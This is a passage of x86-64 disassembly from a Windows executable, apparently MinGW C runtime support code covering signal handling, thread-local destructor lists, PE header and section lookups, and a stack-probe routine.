  4026e6:	41 5c                	pop    %r12
  4026e8:	c3                   	ret
  4026e9:	31 d2                	xor    %edx,%edx
  4026eb:	b9 08 00 00 00       	mov    $0x8,%ecx
  4026f0:	e8 3b 07 00 00       	call   0x402e30
  4026f5:	48 83 f8 01          	cmp    $0x1,%rax
  4026f9:	74 65                	je     0x402760
  4026fb:	48 85 c0             	test   %rax,%rax
  4026fe:	74 b7                	je     0x4026b7
  402700:	b9 08 00 00 00       	mov    $0x8,%ecx
  402705:	ff d0                	call   *%rax
  402707:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40270c:	e9 4c ff ff ff       	jmp    0x40265d
  402711:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402718:	31 d2                	xor    %edx,%edx
  40271a:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40271f:	e8 0c 07 00 00       	call   0x402e30
  402724:	48 83 f8 01          	cmp    $0x1,%rax
  402728:	74 4f                	je     0x402779
  40272a:	48 85 c0             	test   %rax,%rax
  40272d:	74 88                	je     0x4026b7
  40272f:	b9 0b 00 00 00       	mov    $0xb,%ecx
  402734:	ff d0                	call   *%rax
  402736:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40273b:	e9 1d ff ff ff       	jmp    0x40265d
  402740:	ba 01 00 00 00       	mov    $0x1,%edx
  402745:	b9 04 00 00 00       	mov    $0x4,%ecx
  40274a:	e8 e1 06 00 00       	call   0x402e30
  40274f:	83 c8 ff             	or     $0xffffffff,%eax
  402752:	e9 06 ff ff ff       	jmp    0x40265d
  402757:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40275e:	00 00 
  402760:	ba 01 00 00 00       	mov    $0x1,%edx
  402765:	b9 08 00 00 00       	mov    $0x8,%ecx
  40276a:	e8 c1 06 00 00       	call   0x402e30
  40276f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402774:	e9 e4 fe ff ff       	jmp    0x40265d
  402779:	ba 01 00 00 00       	mov    $0x1,%edx
  40277e:	b9 0b 00 00 00       	mov    $0xb,%ecx
  402783:	e8 a8 06 00 00       	call   0x402e30
  402788:	83 c8 ff             	or     $0xffffffff,%eax
  40278b:	e9 cd fe ff ff       	jmp    0x40265d
  402790:	41 54                	push   %r12
  402792:	57                   	push   %rdi
  402793:	56                   	push   %rsi
  402794:	53                   	push   %rbx
  402795:	48 83 ec 28          	sub    $0x28,%rsp
  402799:	48 8d 0d 60 61 00 00 	lea    0x6160(%rip),%rcx        # 0x408900
  4027a0:	ff 15 ae 6a 00 00    	call   *0x6aae(%rip)        # 0x409254
  4027a6:	48 8b 1d 33 61 00 00 	mov    0x6133(%rip),%rbx        # 0x4088e0
  4027ad:	48 85 db             	test   %rbx,%rbx
  4027b0:	74 32                	je     0x4027e4
  4027b2:	48 8b 3d 43 6b 00 00 	mov    0x6b43(%rip),%rdi        # 0x4092fc
  4027b9:	48 8b 35 b4 6a 00 00 	mov    0x6ab4(%rip),%rsi        # 0x409274
  4027c0:	8b 0b                	mov    (%rbx),%ecx
  4027c2:	ff d7                	call   *%rdi
  4027c4:	49 89 c4             	mov    %rax,%r12
  4027c7:	ff d6                	call   *%rsi
  4027c9:	85 c0                	test   %eax,%eax
  4027cb:	75 0e                	jne    0x4027db
  4027cd:	4d 85 e4             	test   %r12,%r12
  4027d0:	74 09                	je     0x4027db
  4027d2:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4027d6:	4c 89 e1             	mov    %r12,%rcx
  4027d9:	ff d0                	call   *%rax
  4027db:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  4027df:	48 85 db             	test   %rbx,%rbx
  4027e2:	75 dc                	jne    0x4027c0
  4027e4:	48 8d 0d 15 61 00 00 	lea    0x6115(%rip),%rcx        # 0x408900
  4027eb:	48 83 c4 28          	add    $0x28,%rsp
  4027ef:	5b                   	pop    %rbx
  4027f0:	5e                   	pop    %rsi
  4027f1:	5f                   	pop    %rdi
  4027f2:	41 5c                	pop    %r12
  4027f4:	48 ff 25 b1 6a 00 00 	rex.W jmp *0x6ab1(%rip)        # 0x4092ac
  4027fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402800:	57                   	push   %rdi
  402801:	56                   	push   %rsi
  402802:	53                   	push   %rbx
  402803:	48 83 ec 20          	sub    $0x20,%rsp
  402807:	8b 05 db 60 00 00    	mov    0x60db(%rip),%eax        # 0x4088e8
  40280d:	89 cf                	mov    %ecx,%edi
  40280f:	48 89 d6             	mov    %rdx,%rsi
  402812:	85 c0                	test   %eax,%eax
  402814:	75 0a                	jne    0x402820
  402816:	48 83 c4 20          	add    $0x20,%rsp
  40281a:	5b                   	pop    %rbx
  40281b:	5e                   	pop    %rsi
  40281c:	5f                   	pop    %rdi
  40281d:	c3                   	ret
  40281e:	66 90                	xchg   %ax,%ax
  402820:	ba 18 00 00 00       	mov    $0x18,%edx
  402825:	b9 01 00 00 00       	mov    $0x1,%ecx
  40282a:	e8 39 06 00 00       	call   0x402e68
  40282f:	48 89 c3             	mov    %rax,%rbx
  402832:	48 85 c0             	test   %rax,%rax
  402835:	74 3c                	je     0x402873
  402837:	89 38                	mov    %edi,(%rax)
  402839:	48 8d 0d c0 60 00 00 	lea    0x60c0(%rip),%rcx        # 0x408900
  402840:	48 89 70 08          	mov    %rsi,0x8(%rax)
  402844:	ff 15 0a 6a 00 00    	call   *0x6a0a(%rip)        # 0x409254
  40284a:	48 8b 05 8f 60 00 00 	mov    0x608f(%rip),%rax        # 0x4088e0
  402851:	48 8d 0d a8 60 00 00 	lea    0x60a8(%rip),%rcx        # 0x408900
  402858:	48 89 1d 81 60 00 00 	mov    %rbx,0x6081(%rip)        # 0x4088e0
  40285f:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402863:	ff 15 43 6a 00 00    	call   *0x6a43(%rip)        # 0x4092ac
  402869:	31 c0                	xor    %eax,%eax
  40286b:	48 83 c4 20          	add    $0x20,%rsp
  40286f:	5b                   	pop    %rbx
  402870:	5e                   	pop    %rsi
  402871:	5f                   	pop    %rdi
  402872:	c3                   	ret
  402873:	83 c8 ff             	or     $0xffffffff,%eax
  402876:	eb 9e                	jmp    0x402816
  402878:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40287f:	00 
  402880:	53                   	push   %rbx
  402881:	48 83 ec 20          	sub    $0x20,%rsp
  402885:	8b 05 5d 60 00 00    	mov    0x605d(%rip),%eax        # 0x4088e8
  40288b:	89 cb                	mov    %ecx,%ebx
  40288d:	85 c0                	test   %eax,%eax
  40288f:	75 0f                	jne    0x4028a0
  402891:	31 c0                	xor    %eax,%eax
  402893:	48 83 c4 20          	add    $0x20,%rsp
  402897:	5b                   	pop    %rbx
  402898:	c3                   	ret
  402899:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4028a0:	48 8d 0d 59 60 00 00 	lea    0x6059(%rip),%rcx        # 0x408900
  4028a7:	ff 15 a7 69 00 00    	call   *0x69a7(%rip)        # 0x409254
  4028ad:	48 8b 0d 2c 60 00 00 	mov    0x602c(%rip),%rcx        # 0x4088e0
  4028b4:	48 85 c9             	test   %rcx,%rcx
  4028b7:	74 2a                	je     0x4028e3
  4028b9:	31 d2                	xor    %edx,%edx
  4028bb:	eb 0e                	jmp    0x4028cb
  4028bd:	0f 1f 00             	nopl   (%rax)
  4028c0:	48 89 ca             	mov    %rcx,%rdx
  4028c3:	48 85 c0             	test   %rax,%rax
  4028c6:	74 1b                	je     0x4028e3
  4028c8:	48 89 c1             	mov    %rax,%rcx
  4028cb:	8b 01                	mov    (%rcx),%eax
  4028cd:	39 d8                	cmp    %ebx,%eax
  4028cf:	48 8b 41 10          	mov    0x10(%rcx),%rax
  4028d3:	75 eb                	jne    0x4028c0
  4028d5:	48 85 d2             	test   %rdx,%rdx
  4028d8:	74 26                	je     0x402900
  4028da:	48 89 42 10          	mov    %rax,0x10(%rdx)
  4028de:	e8 6d 05 00 00       	call   0x402e50
  4028e3:	48 8d 0d 16 60 00 00 	lea    0x6016(%rip),%rcx        # 0x408900
  4028ea:	ff 15 bc 69 00 00    	call   *0x69bc(%rip)        # 0x4092ac
  4028f0:	31 c0                	xor    %eax,%eax
  4028f2:	48 83 c4 20          	add    $0x20,%rsp
  4028f6:	5b                   	pop    %rbx
  4028f7:	c3                   	ret
  4028f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4028ff:	00 
  402900:	48 89 05 d9 5f 00 00 	mov    %rax,0x5fd9(%rip)        # 0x4088e0
  402907:	eb d5                	jmp    0x4028de
  402909:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402910:	53                   	push   %rbx
  402911:	48 83 ec 20          	sub    $0x20,%rsp
  402915:	83 fa 02             	cmp    $0x2,%edx
  402918:	0f 84 c2 00 00 00    	je     0x4029e0
  40291e:	77 28                	ja     0x402948
  402920:	85 d2                	test   %edx,%edx
  402922:	74 4c                	je     0x402970
  402924:	8b 05 be 5f 00 00    	mov    0x5fbe(%rip),%eax        # 0x4088e8
  40292a:	85 c0                	test   %eax,%eax
  40292c:	74 32                	je     0x402960
  40292e:	c7 05 b0 5f 00 00 01 	movl   $0x1,0x5fb0(%rip)        # 0x4088e8
  402935:	00 00 00 
  402938:	b8 01 00 00 00       	mov    $0x1,%eax
  40293d:	48 83 c4 20          	add    $0x20,%rsp
  402941:	5b                   	pop    %rbx
  402942:	c3                   	ret
  402943:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402948:	83 fa 03             	cmp    $0x3,%edx
  40294b:	75 eb                	jne    0x402938
  40294d:	8b 05 95 5f 00 00    	mov    0x5f95(%rip),%eax        # 0x4088e8
  402953:	85 c0                	test   %eax,%eax
  402955:	74 e1                	je     0x402938
  402957:	e8 34 fe ff ff       	call   0x402790
  40295c:	eb da                	jmp    0x402938
  40295e:	66 90                	xchg   %ax,%ax
  402960:	48 8d 0d 99 5f 00 00 	lea    0x5f99(%rip),%rcx        # 0x408900
  402967:	ff 15 37 69 00 00    	call   *0x6937(%rip)        # 0x4092a4
  40296d:	eb bf                	jmp    0x40292e
  40296f:	90                   	nop
  402970:	8b 05 72 5f 00 00    	mov    0x5f72(%rip),%eax        # 0x4088e8
  402976:	85 c0                	test   %eax,%eax
  402978:	74 05                	je     0x40297f
  40297a:	e8 11 fe ff ff       	call   0x402790
  40297f:	8b 05 63 5f 00 00    	mov    0x5f63(%rip),%eax        # 0x4088e8
  402985:	83 f8 01             	cmp    $0x1,%eax
  402988:	75 ae                	jne    0x402938
  40298a:	48 8b 1d 4f 5f 00 00 	mov    0x5f4f(%rip),%rbx        # 0x4088e0
  402991:	48 85 db             	test   %rbx,%rbx
  402994:	74 1b                	je     0x4029b1
  402996:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40299d:	00 00 00 
  4029a0:	48 89 d9             	mov    %rbx,%rcx
  4029a3:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  4029a7:	e8 a4 04 00 00       	call   0x402e50
  4029ac:	48 85 db             	test   %rbx,%rbx
  4029af:	75 ef                	jne    0x4029a0
  4029b1:	48 8d 0d 48 5f 00 00 	lea    0x5f48(%rip),%rcx        # 0x408900
  4029b8:	48 c7 05 1d 5f 00 00 	movq   $0x0,0x5f1d(%rip)        # 0x4088e0
  4029bf:	00 00 00 00 
  4029c3:	c7 05 1b 5f 00 00 00 	movl   $0x0,0x5f1b(%rip)        # 0x4088e8
  4029ca:	00 00 00 
  4029cd:	ff 15 79 68 00 00    	call   *0x6879(%rip)        # 0x40924c
  4029d3:	e9 60 ff ff ff       	jmp    0x402938
  4029d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4029df:	00 
  4029e0:	e8 5b f3 ff ff       	call   0x401d40
  4029e5:	b8 01 00 00 00       	mov    $0x1,%eax
  4029ea:	48 83 c4 20          	add    $0x20,%rsp
  4029ee:	5b                   	pop    %rbx
  4029ef:	c3                   	ret
  4029f0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  4029f4:	48 8d 14 08          	lea    (%rax,%rcx,1),%rdx
  4029f8:	31 c0                	xor    %eax,%eax
  4029fa:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
  402a00:	75 0b                	jne    0x402a0d
  402a02:	31 c0                	xor    %eax,%eax
  402a04:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
  402a0a:	0f 94 c0             	sete   %al
  402a0d:	c3                   	ret
  402a0e:	66 90                	xchg   %ax,%ax
  402a10:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  402a15:	75 09                	jne    0x402a20
  402a17:	eb d7                	jmp    0x4029f0
  402a19:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402a20:	31 c0                	xor    %eax,%eax
  402a22:	c3                   	ret
  402a23:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  402a2a:	00 00 00 00 
  402a2e:	66 90                	xchg   %ax,%ax
  402a30:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  402a34:	48 01 c1             	add    %rax,%rcx
  402a37:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  402a3b:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  402a40:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  402a44:	85 c9                	test   %ecx,%ecx
  402a46:	74 2d                	je     0x402a75
  402a48:	83 e9 01             	sub    $0x1,%ecx
  402a4b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  402a4f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
  402a54:	0f 1f 40 00          	nopl   0x0(%rax)
  402a58:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  402a5c:	4c 89 c1             	mov    %r8,%rcx
  402a5f:	49 39 d0             	cmp    %rdx,%r8
  402a62:	77 08                	ja     0x402a6c
  402a64:	03 48 08             	add    0x8(%rax),%ecx
  402a67:	48 39 d1             	cmp    %rdx,%rcx
  402a6a:	77 0b                	ja     0x402a77
  402a6c:	48 83 c0 28          	add    $0x28,%rax
  402a70:	4c 39 c8             	cmp    %r9,%rax
  402a73:	75 e3                	jne    0x402a58
  402a75:	31 c0                	xor    %eax,%eax
  402a77:	c3                   	ret
  402a78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402a7f:	00 
  402a80:	41 54                	push   %r12
  402a82:	56                   	push   %rsi
  402a83:	53                   	push   %rbx
  402a84:	48 83 ec 20          	sub    $0x20,%rsp
  402a88:	48 89 cb             	mov    %rcx,%rbx
  402a8b:	e8 90 03 00 00       	call   0x402e20
  402a90:	48 83 f8 08          	cmp    $0x8,%rax
  402a94:	77 7a                	ja     0x402b10
  402a96:	48 8b 0d 13 29 00 00 	mov    0x2913(%rip),%rcx        # 0x4053b0
  402a9d:	45 31 e4             	xor    %r12d,%r12d
  402aa0:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  402aa5:	75 57                	jne    0x402afe
  402aa7:	e8 44 ff ff ff       	call   0x4029f0
  402aac:	85 c0                	test   %eax,%eax
  402aae:	74 4e                	je     0x402afe
  402ab0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  402ab4:	48 01 c1             	add    %rax,%rcx
  402ab7:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  402abb:	4c 8d 64 01 18       	lea    0x18(%rcx,%rax,1),%r12
  402ac0:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
  402ac4:	85 c0                	test   %eax,%eax
  402ac6:	74 48                	je     0x402b10
  402ac8:	83 e8 01             	sub    $0x1,%eax
  402acb:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  402acf:	49 8d 74 c4 28       	lea    0x28(%r12,%rax,8),%rsi
  402ad4:	eb 13                	jmp    0x402ae9
  402ad6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402add:	00 00 00 
  402ae0:	49 83 c4 28          	add    $0x28,%r12
  402ae4:	49 39 f4             	cmp    %rsi,%r12
  402ae7:	74 27                	je     0x402b10
  402ae9:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  402aef:	48 89 da             	mov    %rbx,%rdx
  402af2:	4c 89 e1             	mov    %r12,%rcx
  402af5:	e8 1e 03 00 00       	call   0x402e18
  402afa:	85 c0                	test   %eax,%eax
  402afc:	75 e2                	jne    0x402ae0
  402afe:	4c 89 e0             	mov    %r12,%rax
  402b01:	48 83 c4 20          	add    $0x20,%rsp
  402b05:	5b                   	pop    %rbx
  402b06:	5e                   	pop    %rsi
  402b07:	41 5c                	pop    %r12
  402b09:	c3                   	ret
  402b0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  402b10:	45 31 e4             	xor    %r12d,%r12d
  402b13:	4c 89 e0             	mov    %r12,%rax
  402b16:	48 83 c4 20          	add    $0x20,%rsp
  402b1a:	5b                   	pop    %rbx
  402b1b:	5e                   	pop    %rsi
  402b1c:	41 5c                	pop    %r12
  402b1e:	c3                   	ret
  402b1f:	90                   	nop
  402b20:	48 83 ec 28          	sub    $0x28,%rsp
  402b24:	4c 8b 15 85 28 00 00 	mov    0x2885(%rip),%r10        # 0x4053b0
  402b2b:	45 31 c0             	xor    %r8d,%r8d
  402b2e:	66 41 81 3a 4d 5a    	cmpw   $0x5a4d,(%r10)
  402b34:	49 89 c9             	mov    %rcx,%r9
  402b37:	75 60                	jne    0x402b99
  402b39:	4c 89 d1             	mov    %r10,%rcx
  402b3c:	e8 af fe ff ff       	call   0x4029f0
  402b41:	85 c0                	test   %eax,%eax
  402b43:	74 54                	je     0x402b99
  402b45:	49 63 42 3c          	movslq 0x3c(%r10),%rax
  402b49:	4c 89 c9             	mov    %r9,%rcx
  402b4c:	4c 29 d1             	sub    %r10,%rcx
  402b4f:	49 01 c2             	add    %rax,%r10
  402b52:	41 0f b7 42 14       	movzwl 0x14(%r10),%eax
  402b57:	4d 8d 44 02 18       	lea    0x18(%r10,%rax,1),%r8
  402b5c:	41 0f b7 42 06       	movzwl 0x6(%r10),%eax
  402b61:	85 c0                	test   %eax,%eax
  402b63:	74 31                	je     0x402b96
  402b65:	83 e8 01             	sub    $0x1,%eax
  402b68:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  402b6c:	4d 8d 4c c0 28       	lea    0x28(%r8,%rax,8),%r9
  402b71:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402b78:	41 8b 50 0c          	mov    0xc(%r8),%edx
  402b7c:	48 89 d0             	mov    %rdx,%rax
  402b7f:	48 39 d1             	cmp    %rdx,%rcx
  402b82:	72 09                	jb     0x402b8d
  402b84:	41 03 40 08          	add    0x8(%r8),%eax
  402b88:	48 39 c1             	cmp    %rax,%rcx
  402b8b:	72 0c                	jb     0x402b99
  402b8d:	49 83 c0 28          	add    $0x28,%r8
  402b91:	4d 39 c8             	cmp    %r9,%r8
  402b94:	75 e2                	jne    0x402b78
  402b96:	45 31 c0             	xor    %r8d,%r8d
  402b99:	4c 89 c0             	mov    %r8,%rax
  402b9c:	48 83 c4 28          	add    $0x28,%rsp
  402ba0:	c3                   	ret
  402ba1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  402ba8:	00 00 00 00 
  402bac:	0f 1f 40 00          	nopl   0x0(%rax)
  402bb0:	48 83 ec 28          	sub    $0x28,%rsp
  402bb4:	48 8b 0d f5 27 00 00 	mov    0x27f5(%rip),%rcx        # 0x4053b0
  402bbb:	31 c0                	xor    %eax,%eax
  402bbd:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  402bc2:	75 12                	jne    0x402bd6
  402bc4:	e8 27 fe ff ff       	call   0x4029f0
  402bc9:	85 c0                	test   %eax,%eax
  402bcb:	74 09                	je     0x402bd6
  402bcd:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  402bd1:	0f b7 44 08 06       	movzwl 0x6(%rax,%rcx,1),%eax
  402bd6:	48 83 c4 28          	add    $0x28,%rsp
  402bda:	c3                   	ret
  402bdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402be0:	48 83 ec 28          	sub    $0x28,%rsp
  402be4:	45 31 c0             	xor    %r8d,%r8d
  402be7:	49 89 c9             	mov    %rcx,%r9
  402bea:	48 8b 0d bf 27 00 00 	mov    0x27bf(%rip),%rcx        # 0x4053b0
  402bf1:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  402bf6:	75 4c                	jne    0x402c44
  402bf8:	e8 f3 fd ff ff       	call   0x4029f0
  402bfd:	85 c0                	test   %eax,%eax
  402bff:	74 43                	je     0x402c44
  402c01:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  402c05:	48 01 c1             	add    %rax,%rcx
  402c08:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  402c0c:	4c 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%r8
  402c11:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
  402c15:	85 c0                	test   %eax,%eax
  402c17:	74 28                	je     0x402c41
  402c19:	83 e8 01             	sub    $0x1,%eax
  402c1c:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  402c20:	49 8d 44 c0 28       	lea    0x28(%r8,%rax,8),%rax
  402c25:	0f 1f 00             	nopl   (%rax)
  402c28:	41 f6 40 27 20       	testb  $0x20,0x27(%r8)
  402c2d:	74 09                	je     0x402c38
  402c2f:	4d 85 c9             	test   %r9,%r9
  402c32:	74 10                	je     0x402c44
  402c34:	49 83 e9 01          	sub    $0x1,%r9
  402c38:	49 83 c0 28          	add    $0x28,%r8
  402c3c:	49 39 c0             	cmp    %rax,%r8
  402c3f:	75 e7                	jne    0x402c28
  402c41:	45 31 c0             	xor    %r8d,%r8d
  402c44:	4c 89 c0             	mov    %r8,%rax
  402c47:	48 83 c4 28          	add    $0x28,%rsp
  402c4b:	c3                   	ret
  402c4c:	0f 1f 40 00          	nopl   0x0(%rax)
  402c50:	48 83 ec 28          	sub    $0x28,%rsp
  402c54:	48 8b 0d 55 27 00 00 	mov    0x2755(%rip),%rcx        # 0x4053b0
  402c5b:	45 31 c0             	xor    %r8d,%r8d
  402c5e:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  402c63:	75 0b                	jne    0x402c70
  402c65:	e8 86 fd ff ff       	call   0x4029f0
  402c6a:	85 c0                	test   %eax,%eax
  402c6c:	4c 0f 45 c1          	cmovne %rcx,%r8
  402c70:	4c 89 c0             	mov    %r8,%rax
  402c73:	48 83 c4 28          	add    $0x28,%rsp
  402c77:	c3                   	ret
  402c78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402c7f:	00 
  402c80:	48 83 ec 28          	sub    $0x28,%rsp
  402c84:	4c 8b 0d 25 27 00 00 	mov    0x2725(%rip),%r9        # 0x4053b0
  402c8b:	31 c0                	xor    %eax,%eax
  402c8d:	66 41 81 39 4d 5a    	cmpw   $0x5a4d,(%r9)
  402c93:	49 89 c8             	mov    %rcx,%r8
  402c96:	75 57                	jne    0x402cef
  402c98:	4c 89 c9             	mov    %r9,%rcx
  402c9b:	e8 50 fd ff ff       	call   0x4029f0
  402ca0:	85 c0                	test   %eax,%eax
  402ca2:	74 4b                	je     0x402cef
  402ca4:	49 63 41 3c          	movslq 0x3c(%r9),%rax
  402ca8:	4c 89 c1             	mov    %r8,%rcx
  402cab:	4c 29 c9             	sub    %r9,%rcx
  402cae:	49 01 c1             	add    %rax,%r9
  402cb1:	41 0f b7 41 14       	movzwl 0x14(%r9),%eax
  402cb6:	41 0f b7 51 06       	movzwl 0x6(%r9),%edx
  402cbb:	49 8d 44 01 18       	lea    0x18(%r9,%rax,1),%rax
  402cc0:	85 d2                	test   %edx,%edx
  402cc2:	74 29                	je     0x402ced
  402cc4:	83 ea 01             	sub    $0x1,%edx
  402cc7:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  402ccb:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
  402cd0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  402cd4:	4c 89 c2             	mov    %r8,%rdx
  402cd7:	4c 39 c1             	cmp    %r8,%rcx
  402cda:	72 08                	jb     0x402ce4
  402cdc:	03 50 08             	add    0x8(%rax),%edx
  402cdf:	48 39 d1             	cmp    %rdx,%rcx
  402ce2:	72 14                	jb     0x402cf8
  402ce4:	48 83 c0 28          	add    $0x28,%rax
  402ce8:	4c 39 c8             	cmp    %r9,%rax
  402ceb:	75 e3                	jne    0x402cd0
  402ced:	31 c0                	xor    %eax,%eax
  402cef:	48 83 c4 28          	add    $0x28,%rsp
  402cf3:	c3                   	ret
  402cf4:	0f 1f 40 00          	nopl   0x0(%rax)
  402cf8:	8b 40 24             	mov    0x24(%rax),%eax
  402cfb:	f7 d0                	not    %eax
  402cfd:	c1 e8 1f             	shr    $0x1f,%eax
  402d00:	48 83 c4 28          	add    $0x28,%rsp
  402d04:	c3                   	ret
  402d05:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  402d0c:	00 00 00 00 
  402d10:	48 83 ec 28          	sub    $0x28,%rsp
  402d14:	4c 8b 1d 95 26 00 00 	mov    0x2695(%rip),%r11        # 0x4053b0
  402d1b:	45 31 c9             	xor    %r9d,%r9d
  402d1e:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
  402d24:	41 89 c8             	mov    %ecx,%r8d
  402d27:	75 5f                	jne    0x402d88
  402d29:	4c 89 d9             	mov    %r11,%rcx
  402d2c:	e8 bf fc ff ff       	call   0x4029f0
  402d31:	85 c0                	test   %eax,%eax
  402d33:	74 53                	je     0x402d88
  402d35:	49 63 4b 3c          	movslq 0x3c(%r11),%rcx
  402d39:	4c 01 d9             	add    %r11,%rcx
  402d3c:	8b 81 90 00 00 00    	mov    0x90(%rcx),%eax
  402d42:	85 c0                	test   %eax,%eax
  402d44:	74 42                	je     0x402d88
  402d46:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
  402d4a:	48 8d 54 11 18       	lea    0x18(%rcx,%rdx,1),%rdx
  402d4f:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  402d53:	85 c9                	test   %ecx,%ecx
  402d55:	74 31                	je     0x402d88
  402d57:	83 e9 01             	sub    $0x1,%ecx
  402d5a:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  402d5e:	4c 8d 54 ca 28       	lea    0x28(%rdx,%rcx,8),%r10
  402d63:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402d68:	44 8b 4a 0c          	mov    0xc(%rdx),%r9d
  402d6c:	4c 89 c9             	mov    %r9,%rcx
  402d6f:	4c 39 c8             	cmp    %r9,%rax
  402d72:	72 08                	jb     0x402d7c
  402d74:	03 4a 08             	add    0x8(%rdx),%ecx
  402d77:	48 39 c8             	cmp    %rcx,%rax
  402d7a:	72 14                	jb     0x402d90
  402d7c:	48 83 c2 28          	add    $0x28,%rdx
  402d80:	4c 39 d2             	cmp    %r10,%rdx
  402d83:	75 e3                	jne    0x402d68
  402d85:	45 31 c9             	xor    %r9d,%r9d
  402d88:	4c 89 c8             	mov    %r9,%rax
  402d8b:	48 83 c4 28          	add    $0x28,%rsp
  402d8f:	c3                   	ret
  402d90:	4c 01 d8             	add    %r11,%rax
  402d93:	eb 0b                	jmp    0x402da0
  402d95:	0f 1f 00             	nopl   (%rax)
  402d98:	41 83 e8 01          	sub    $0x1,%r8d
  402d9c:	48 83 c0 14          	add    $0x14,%rax
  402da0:	8b 48 04             	mov    0x4(%rax),%ecx
  402da3:	85 c9                	test   %ecx,%ecx
  402da5:	75 07                	jne    0x402dae
  402da7:	8b 50 0c             	mov    0xc(%rax),%edx
  402daa:	85 d2                	test   %edx,%edx
  402dac:	74 d7                	je     0x402d85
  402dae:	45 85 c0             	test   %r8d,%r8d
  402db1:	7f e5                	jg     0x402d98
  402db3:	44 8b 48 0c          	mov    0xc(%rax),%r9d
  402db7:	4d 01 d9             	add    %r11,%r9
  402dba:	4c 89 c8             	mov    %r9,%rax
  402dbd:	48 83 c4 28          	add    $0x28,%rsp
  402dc1:	c3                   	ret
  402dc2:	90                   	nop
  402dc3:	90                   	nop
  402dc4:	90                   	nop
  402dc5:	90                   	nop
  402dc6:	90                   	nop
  402dc7:	90                   	nop
  402dc8:	90                   	nop
  402dc9:	90                   	nop
  402dca:	90                   	nop
  402dcb:	90                   	nop
  402dcc:	90                   	nop
  402dcd:	90                   	nop
  402dce:	90                   	nop
  402dcf:	90                   	nop
  402dd0:	51                   	push   %rcx
  402dd1:	50                   	push   %rax
  402dd2:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  402dd8:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
  402ddd:	72 19                	jb     0x402df8
  402ddf:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
  402de6:	48 83 09 00          	orq    $0x0,(%rcx)
  402dea:	48 2d 00 10 00 00    	sub    $0x1000,%rax
  402df0:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  402df6:	77 e7                	ja     0x402ddf
  402df8:	48 29 c1             	sub    %rax,%rcx
  402dfb:	48 83 09 00          	orq    $0x0,(%rcx)
  402dff:	58                   	pop    %rax
  402e00:	59                   	pop    %rcx
  402e01:	c3                   	ret
  402e02:	90                   	nop
  402e03:	90                   	nop
  402e04:	90                   	nop
  402e05:	90                   	nop
  402e06:	90                   	nop
  402e07:	90                   	nop
  402e08:	90                   	nop
  402e09:	90                   	nop
  402e0a:	90                   	nop
  402e0b:	90                   	nop
